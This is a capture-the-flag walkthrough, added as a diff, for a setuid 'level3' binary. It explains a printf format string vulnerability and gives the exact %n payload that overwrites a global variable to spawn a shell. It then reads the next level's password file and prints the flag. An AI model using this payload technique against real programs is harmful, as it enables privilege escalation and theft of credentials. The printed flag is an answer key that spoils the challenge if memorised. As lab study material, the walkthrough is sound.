@@ -1,0 +1,51 @@
+# Level3 Walkthrough
+
+Binary is setuid `level4`. `main` only calls `v`:
+
+```c
+int m;
+
+void v(void) {
+  char buffer[520];
+
+  fgets(buffer, 512, stdin);
+  printf(buffer);
+  if (m == 64) {
+    fwrite("Wait what?!\n", 1, 12, stdout);
+    system("/bin/sh");
+  }
+}
+```
+
+## Vulnerability
+
+`fgets` is bounded (512 into 520), so no overflow. The bug is `printf(buffer)`:
+the user input is used directly as the format string (format string vulnerability).
+With `%n`, `printf` can write the number of printed characters to an arbitrary
+address.
+
+Goal: set the global `m` to 64 so `system("/bin/sh")` runs.
+
+## Exploitation
+
+- Address of `m`: `nm level3 | grep ' m$'` -> `0x0804988c`.
+- Offset: `python -c 'print "AAAA" + ".%x"*10' | ./level3` shows `41414141` at the
+  4th position, so our buffer is argument 4.
+
+Payload: `m` address (so `%4$n` targets it) + `%60d` so the printed count reaches
+`4 + 60 = 64`, then `%4$n` writes 64 into `m`.
+
+```sh
+(python -c 'print "\x8c\x98\x04\x08" + "%60d" + "%4$n"'; cat) | ./level3
+```
+
+```sh
+whoami            # level4
+cat /home/user/level4/.pass
+```
+
+Flag:
+
+```txt
+b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
+```
